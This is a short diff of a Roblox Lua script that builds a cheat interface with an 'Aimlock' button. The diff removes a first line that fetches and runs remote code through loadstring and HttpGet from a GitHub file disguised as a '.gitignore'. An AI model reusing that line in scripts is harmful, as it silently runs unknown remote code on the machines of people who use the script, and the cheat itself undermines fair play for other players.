@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/creepyV4/log-1/57a2cbc4e0068b1e4aca4161a2b9486f42b90ff2/.gitignore"))()
-
 local ScreenGui = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local Aimlock = Instance.new("TextButton")
